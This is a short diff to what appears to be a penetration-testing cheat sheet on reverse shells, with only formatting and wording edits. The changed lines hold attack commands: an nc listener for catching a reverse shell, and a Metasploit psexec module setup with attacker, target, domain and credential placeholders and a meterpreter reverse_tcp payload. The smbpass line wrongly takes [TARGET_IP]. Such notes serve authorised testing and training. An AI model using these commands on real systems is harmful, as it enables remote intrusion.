@@ -32,7 +32,7 @@ Reverse shells are a good way to bypass firewalls. The drawback is that we need 
 
  > 
  > **<font color=red>nc -lvnp</font> \[ATTACKER_PORT\]**</br>
- > Open a listener on port 2112
+ > Open a listener on delected port.
 
 ---
 
@@ -114,11 +114,11 @@ Location on Kali: <font color=lightblue>/usr/share/webshells/php/php-reverse-she
  > 
  > **<font color=red>use</font> <font color=lightblue>exploit/windows/smb/psexec</font>**
  > 
- > **<font color=red>set lhost</font> \[ATTACKER_IP\]**
- > **<font color=red>set rhosts</font> \[TARGET_IP\]**
- > **<font color=red>set smbdomain</font> \[TARGET_DOMAIN\]**
- > **<font color=red>set smbuser </font>\[TARGET_USER\]**
- > **<font color=red>set smbpass</font> \[TARGET_IP\]**
+ > **<font color=red>set lhost</font> \[ATTACKER_IP\]**</br>
+ > **<font color=red>set rhosts</font> \[TARGET_IP\]**</br>
+ > **<font color=red>set smbdomain</font> \[TARGET_DOMAIN\]**</br>
+ > **<font color=red>set smbuser </font>\[TARGET_USER\]**</br>
+ > **<font color=red>set smbpass</font> \[TARGET_IP\]**</br>
  > **<font color=red>set payload </font>windows/x64/meterpreter/reverse_tcp**</br>
  > Create a reverse shell from a SMB share.
 
